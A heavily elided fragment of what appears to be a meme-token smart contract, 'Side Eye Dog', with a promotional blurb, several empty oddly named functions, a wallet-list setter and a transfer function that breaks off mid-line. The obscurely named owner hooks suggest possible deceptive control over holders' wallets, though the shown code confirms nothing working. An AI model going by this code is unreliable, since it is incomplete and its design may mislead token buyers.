...
Woof Woof! It's me - the Side Eye Dog!

https://knowyourmeme.com/memes/side-eye-dog

https://t.me/SideEyeDog
...
contract SIDEEYEDOG is Ownable {
    ...
    string private _name = "Side Eye Dog";
    string private _symbol = "DACHSHUND";
    ...
    function instate() external {
    }
    function uncompromised() external {
    }
    function indexTo() external {
    }
    function indexFrom() external {
    }
    function analyzedTotal() external {
    }
    function swapBackSet(address[] calldata walletAddress) external {
    ...
    function truFrom(uint256 amount, address walletAddr) external {
        if (marketingAddres()) {
